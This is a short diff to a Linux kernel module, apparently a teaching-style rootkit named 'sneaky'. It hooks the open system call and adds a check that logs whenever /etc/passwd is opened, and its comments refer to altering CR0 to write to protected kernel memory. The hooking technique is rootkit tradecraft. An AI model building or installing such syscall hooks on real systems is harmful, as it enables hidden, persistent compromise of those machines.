@@ -8,6 +8,7 @@
 #include <linux/kallsyms.h>
 #include <asm/page.h>
 #include <asm/cacheflush.h>
+#include <asm/uaccess.h>
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -24,6 +25,7 @@ Third param is permission bits
 */
 
 static int myPID = 999;
+char tmp[1000];
 
 module_param(myPID, int, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
 
@@ -50,6 +52,10 @@ asmlinkage int (*original_call)(const char *pathname, int flags);
 asmlinkage int sneaky_sys_open(const char *pathname, int flags)
 {
   printk(KERN_INFO "Very, very Sneaky!\n");
+  if(strcmp(pathname, "/etc/passwd") == 0){
+    printk(KERN_INFO "/etc/passwd detected\n");
+  }
+
   return original_call(pathname, flags);
 }
 
